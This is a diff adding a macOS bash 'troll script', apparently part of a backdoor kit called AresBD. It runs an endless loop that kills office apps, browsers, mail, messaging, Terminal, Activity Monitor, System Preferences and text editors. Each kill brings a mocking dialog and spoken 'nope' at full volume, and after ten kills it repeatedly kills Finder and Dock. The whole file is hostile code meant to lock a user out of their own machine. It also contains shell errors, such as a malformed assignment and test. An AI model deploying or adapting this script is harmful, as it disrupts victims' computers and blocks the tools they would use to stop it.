@@ -1,0 +1,56 @@
+#!/bin/bash
+# AresBD Troll Script by Ohnx and Stsosz
+# As you can see, this kills pretty much every app that you might ever want to use on an OSX System.
+# Don't be an asshole. Don't use this without permission. I'm not responsible for
+# Any stupid stuff you do with AresBD. 
+
+count = 0
+while true; do
+# Office Apps
+var=$((`killall -v "Microsoft Word" | wc -l` + `killall -v "Microsoft PowerPoint" | wc -l` + `killall -v "Keynote" | wc -l` + `killall -v "Pages" | wc -l` + `killall -v "Numbers" | wc -l`))
+# Misc Apps
+var+=$((`killall -v iBooks | wc -l` + 0))
+var+=$((`killall -v GarageBand | wc -l` + 0))
+var+=$((`killall -v "App Store" | wc -l` + 0))
+var+=$((`killall -v "iTunes" | wc -l` + 0))
+var+=$((`killall -v "Java" | wc -l` + 0))
+# Other
+var+=$((`killall -v "Activity Monitor" | wc -l` + 0))
+# var+=$((`killall -v "Finder" | wc -l` + 0))
+var+=$((`killall -v "Terminal" | wc -l` + 0))
+var+=$((`killall -v "System Preferences" | wc -l` + 0))
+# Web Browsing
+var+=$((`killall -v "Safari" | wc -l` + 0))
+var+=$((`killall -v "Google Chrome" | wc -l` + 0))
+var+=$((`killall -v "Firefox" | wc -l` + 0))
+# Other
+var+=$((`killall -v "Mail" | wc -l` + 0))
+var+=$((`killall -v "Contacts" | wc -l` + 0))
+var+=$((`killall -v "Notes" | wc -l` + 0))
+var+=$((`killall -v "Maps" | wc -l` + 0))
+var+=$((`killall -v "Messages" | wc -l` + 0))
+var+=$((`killall -v "FaceTime" | wc -l` + 0))
+var+=$((`killall -v "Photo Booth" | wc -l` + 0))
+var+=$((`killall -v "iPhoto" | wc -l` + 0))
+var+=$((`killall -v "Notes" | wc -l` + 0))
+# Block text editors
+var+=$((`killall -v "TextEdit" | wc -l` + 0))
+var+=$((`killall -v "TextWrangler" | wc -l` + 0))
+var+=$((`killall -v "Terminal" | wc -l` + 0))
+((count += var))
+if [ $var -gt 0 ]; then
+osascript -e 'tell app "System Events" to display dialog "Nope.avi"'
+osascript -e "set volume 7"
+say nope
+if [$count -gt 10 ]; then
+while true; do
+osascript -e 'tell app "System Events" to display dialog "Screw you."'
+osascript -e "set volume 7"
+say nope
+killall Finder
+killall Dock
+done
+fi
+fi
+done
+cd /Applications; find *.app -d | grep \w*.app$
